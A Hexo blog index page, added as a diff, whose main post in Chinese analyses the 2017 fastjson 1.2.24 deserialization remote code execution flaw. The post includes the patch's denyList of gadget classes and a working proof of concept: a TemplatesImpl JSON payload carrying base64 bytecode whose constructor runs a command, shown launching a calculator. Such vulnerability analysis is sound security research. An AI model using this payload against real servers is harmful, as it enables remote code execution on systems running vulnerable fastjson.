@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-title- fastjson 远程反序列化poc的构造和分析" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/" class="article-date">
+  <time datetime="2017-04-29T14:27:22.490Z" itemprop="datePublished">2017-04-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/">fastjson 远程反序列化poc的构造和分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>fastjson 反序列化 poc 1.2.24</p>
+<hr>
+<p>#1 背景</p>
+<p>fastjson是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过8k，在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 <code>https://github.com/alibaba/fastjson/wiki/security_update_20170315</code></p>
+<p>#2 受影响的版本</p>
+<pre><code>fastjson &lt;= 1.2.24
+</code></pre><p>#3 静态分析</p>
+<p>根据官方给出的补丁文件，主要的更新在这个checkAutoType函数上，而这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。具体包括<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework</div></pre></td></tr></table></figure></p>
+<p>下面我们来分析checkAutoType的函数实现：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</div><div class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (typeName.length() &gt;= maxTypeNameLength) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</div><div class="line">                String accept = acceptList[i];</div><div class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</div><div class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</div><div class="line">                String deny = denyList[i];</div><div class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</div><div class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</div><div class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</div><div class="line">            clazz = deserializers.findClass(typeName);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">return</span> clazz;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
+<p>核心部分就是denyList的处理过程，遍历denyList，如果引入的库以denyList中某个deny打头，就会抛出异常，中断运行。</p>
+<p>#4 POC构造<br>静态分析得知，要构造一个可用的poc，肯定得引入denyList的库。刚开始fastjson官方公布漏洞信息时，当时就尝试构造poc，怎奈fastjson的代码确实庞大，还有asm机制，通过asm机制生成的临时代码下不了断点。当时也只能通过在通过类初始化的时候弹出一个计算器，很显然这个构造方式不具有通用性，最近jackson爆出反序列漏洞，其中就利用了TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，简直不能再更妙，这就解决了fastjson通过字段传入一个类，再通过这个类执行有害代码。后来阅读ysoserial的代码时也发现在gadgets.java这个文件中也使用到了这个类来动态生成可执行命令的代码。下面是一个poc的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</div><div class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</div><div class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</div><div class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</div><div class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</div><div class="line"></div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        Test t = <span class="keyword">new</span> Test();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这个是Test.java的实现，在Test.java的构造函数中执行了一条命令，弹出计算器。编译Test.java得到Test.class供后续使用。后续会将Test.class的内容赋值给_bytecodes。接着分析poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> person;</div><div class="line"></div><div class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</div><div class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</div><div class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</div><div class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</div><div class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</div><div class="line"></div><div class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</div><div class="line"><span class="keyword">import</span> java.io.File;</div><div class="line"><span class="keyword">import</span> java.io.FileInputStream;</div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * Created by web on 2017/4/29.</div><div class="line"> */</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</div><div class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</div><div class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">test_autoTypeDeny</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</div><div class="line">        <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</div><div class="line">        <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"\\target\\classes\\person\\Test.class"</span>;</div><div class="line">        String evilCode = readClass(evilClassPath);</div><div class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</div><div class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</div><div class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b',\"_outputProperties\":&#123; &#125;,"</span> +</div><div class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</div><div class="line">        System.out.println(text1);</div><div class="line">       </div><div class="line">        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</div><div class="line">        <span class="comment">//assertEquals(Model.class, obj.getClass());</span></div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            test_autoTypeDeny();</div><div class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在这个poc中，最核心的部分是_bytecodes，它是要执行的代码，@type是指定的解析类，fastjson会根据指定类去反序列化得到该类的实例，在默认情况下，fastjson只会反序列化公开的属性和域，而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，所以是设置不了的，弹计算器的图中的poc中展示了但是实际运行却没有使用，只能依赖于jdk的实现，作者在1.8.0_25,1.7.0_05测试都能弹出计算器，某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。接下来我们看下TemplatesImpl.java的几个关键函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></div><div class="line">    <span class="keyword">throws</span> TransformerConfigurationException</div><div class="line">&#123;</div><div class="line">    TransformerImpl transformer;</div><div class="line"></div><div class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</div><div class="line">        _indentNumber, _tfactory);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</div><div class="line">        transformer.setURIResolver(_uriResolver);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</div><div class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> transformer;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></div><div class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</div><div class="line"></div><div class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></div><div class="line">            <span class="comment">// class to prevent the GC from collecting them</span></div><div class="line">            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</div><div class="line">            translet.postInitialization();</div><div class="line">            translet.setTemplates(<span class="keyword">this</span>);</div><div class="line">            translet.setServicesMechnism(_useServicesMechanism);</div><div class="line">            <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</div><div class="line">                translet.setAuxiliaryClasses(_auxClasses);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">return</span> translet;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">catch</span> (InstantiationException e) &#123;</div><div class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">catch</span> (IllegalAccessException e) &#123;</div><div class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></div><div class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</div><div class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        TransletClassLoader loader = (TransletClassLoader)</div><div class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</div><div class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader());</div><div class="line">                &#125;</div><div class="line">            &#125;);</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</div><div class="line">            _class = <span class="keyword">new</span> Class[classCount];</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</div><div class="line">                _auxClasses = <span class="keyword">new</span> Hashtable();</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</div><div class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</div><div class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</div><div class="line"></div><div class="line">                <span class="comment">// Check if this is the main class</span></div><div class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</div><div class="line">                    _transletIndex = i;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">else</span> &#123;</div><div class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</div><div class="line">                ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</div><div class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</div><div class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>在getTransletInstance调用defineTransletClasses，在defineTransletClasses方法中会根据_bytecodes来生成一个java类，生成的java类随后会被getTransletInstance方法用到生成一个实例，也也就到了最终的执行命令的位置Runtime.getRuntime.exec()</p>
+<p>下面我们上一张调用链的图，<img src="/images/diaoyonglian.png" alt="调用链">,简单来说就是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">JSON.parseObject</div><div class="line">...</div><div class="line">JavaBeanDeserializer.deserialze</div><div class="line">...</div><div class="line">FieldDeserializer.setValue</div><div class="line">...</div><div class="line">TemplatesImpl.getOutputProperties</div><div class="line">TemplatesImpl.newTransformer</div><div class="line">TemplatesImpl.getTransletInstance</div><div class="line">...</div><div class="line">Runtime.getRuntime().exec</div></pre></td></tr></table></figure>
+<p>附上一张成功执行图：<img src="/images/run-ok.png" alt="运行成功"></p>
+<p>#5 总结</p>
+<p>poc影响jdk 1.7，1.8版本，1.6未测试，但是需要在parseObject的时候设置Feature.SupportNonPublicField，最后给大家上个福利，github地址：完整的Intellij IDEA poc环境:</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/" data-id="cj23d2r9n00006kvb4zf4npyw" class="article-share-link">Partager</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/04/29/hello-world/" class="article-date">
+  <time datetime="2017-04-29T08:46:48.137Z" itemprop="datePublished">2017-04-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/29/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/04/29/hello-world/" data-id="cj23cicry0000m0vbi9s675pd" class="article-share-link">Partager</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Articles récents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/">fastjson 远程反序列化poc的构造和分析</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/29/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 John Doe<br>
+      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
